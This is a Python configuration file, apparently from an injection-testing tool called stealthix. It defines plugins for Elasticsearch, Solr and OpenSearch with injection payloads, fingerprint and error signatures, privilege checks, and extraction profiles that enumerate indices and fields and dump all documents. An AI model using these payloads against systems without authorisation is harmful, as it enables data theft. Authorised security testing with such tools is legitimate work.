from __future__ import annotations

from stealthix.plugins.base import Plugin

SEARCH_PLUGINS = [
    Plugin(
        "elasticsearch",
        "nosql",
        dbms="elasticsearch",
        payloads=[
            '{"query": {"bool": {"must": [{"term": {"field": "1"}}]}}}',
            '{"query": {"match_all": {}}}',
        ],
        fingerprints=["elasticsearch", "query_dsl"],
        error_signatures=["elasticsearch", "query_dsl", "parsing_exception"],
        version_queries=['{"query": {"match_all": {}}}', "GET /_cluster/health"],
        privilege_checks=["GET /_security/user", "GET /_security/role"],
        os_queries=["GET /_nodes/stats/os"],
        preferred_techniques="BET",
        extraction_profiles={
            "databases": {
                "payloads": ["GET /_cat/indices?v", "GET /_aliases"],
                "patterns": [r"\bindex[:=\s]+([a-z0-9_\-]+)", r"\bdatabase[:=\s]+([a-z0-9_\-]+)"],
            },
            "tables": {
                "payloads": ["GET /_cat/indices?v", "GET /_mapping"],
                "patterns": [r"\bindex[:=\s]+([a-z0-9_\-]+)", r"\btable[:=\s]+([a-z0-9_\-]+)"],
            },
            "columns": {
                "payloads": ["GET /_mapping", "GET /_field_caps"],
                "patterns": [r"\bfield[:=\s]+([a-z0-9_\-]+)", r"\bcolumn[:=\s]+([a-z0-9_\-]+)"],
            },
            "dump": {
                "payloads": ['{"query": {"match_all": {}}}', "GET /_search"],
            },
            "files": {"disabled": True},
            "os": {"disabled": True},
        },
    ),
    Plugin(
        "solr",
        "nosql",
        dbms="solr",
        payloads=['field:value OR field:"1"', 'field:"1" OR field:"1"'],
        fingerprints=["solr", "lucene"],
        error_signatures=["solr", "lucene", "syntax error"],
        version_queries=["GET /solr/admin/info", "GET /solr/admin/system"],
        privilege_checks=["GET /solr/admin/authentication", "GET /solr/admin/authorization"],
        os_queries=["GET /solr/admin/system"],
        preferred_techniques="BET",
        extraction_profiles={
            "databases": {
                "payloads": [
                    "GET /solr/admin/cores?action=STATUS",
                    "GET /solr/admin/collections?action=LIST",
                ],
                "patterns": [r"\bcore[:=\s]+([a-z0-9_\-]+)", r"\bdatabase[:=\s]+([a-z0-9_\-]+)"],
            },
            "tables": {
                "payloads": [
                    "GET /solr/admin/cores?action=STATUS",
                    "GET /solr/admin/collections?action=LIST",
                ],
                "patterns": [r"\bcore[:=\s]+([a-z0-9_\-]+)", r"\btable[:=\s]+([a-z0-9_\-]+)"],
            },
            "columns": {
                "payloads": ["GET /solr/schema", "GET /solr/admin/cores?action=STATUS&wt=xml"],
                "patterns": [r"\bfield[:=\s]+([a-z0-9_\-]+)", r"\bcolumn[:=\s]+([a-z0-9_\-]+)"],
            },
            "dump": {
                "payloads": ["q=*:*", "GET /solr/select?q=*:*"],
            },
            "files": {"disabled": True},
            "os": {"disabled": True},
        },
    ),
    Plugin(
        "opensearch",
        "nosql",
        dbms="opensearch",
        payloads=[
            '{"query": {"bool": {"must": [{"term": {"field": "1"}}]}}}',
            '{"query": {"match_all": {}}}',
        ],
        fingerprints=["opensearch", "query_dsl"],
        error_signatures=["opensearch", "query_dsl", "parsing_exception"],
        version_queries=['{"query": {"match_all": {}}}', "GET /_cluster/health"],
        privilege_checks=["GET /_security/user", "GET /_security/role"],
        os_queries=["GET /_nodes/stats/os"],
        preferred_techniques="BET",
        extraction_profiles={
            "databases": {
                "payloads": ["GET /_cat/indices?v", "GET /_aliases"],
                "patterns": [r"\bindex[:=\s]+([a-z0-9_\-]+)", r"\bdatabase[:=\s]+([a-z0-9_\-]+)"],
            },
            "tables": {
                "payloads": ["GET /_cat/indices?v", "GET /_mapping"],
                "patterns": [r"\bindex[:=\s]+([a-z0-9_\-]+)", r"\btable[:=\s]+([a-z0-9_\-]+)"],
            },
            "columns": {
                "payloads": ["GET /_mapping", "GET /_field_caps"],
                "patterns": [r"\bfield[:=\s]+([a-z0-9_\-]+)", r"\bcolumn[:=\s]+([a-z0-9_\-]+)"],
            },
            "dump": {
                "payloads": ['{"query": {"match_all": {}}}', "GET /_search"],
            },
            "files": {"disabled": True},
            "os": {"disabled": True},
        },
    ),
]

__all__ = ["SEARCH_PLUGINS"]
